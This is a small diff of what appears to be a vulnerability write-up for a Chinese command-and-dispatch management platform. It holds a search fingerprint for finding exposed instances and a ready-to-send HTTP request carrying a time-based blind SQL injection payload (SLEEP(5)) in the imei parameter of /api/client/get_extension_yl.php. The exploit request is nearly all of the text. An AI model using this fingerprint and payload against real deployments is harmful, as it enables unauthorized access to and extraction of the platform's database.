@@ -4,7 +4,7 @@
 ```
 body="app/structure/departments.php"||app="指挥调度管理平台"
 ```
-## poc
+## POC
 ```
 GET /api/client/get_extension_yl.php?imei=1%27%20AND%20(SELECT%207545%20FROM%20(SELECT(SLEEP(5)))Zjzw)%20AND%20%27czva%27=%27czva&timestamp=1&sign=1 HTTP/1.1
 Host: x.x.x.x
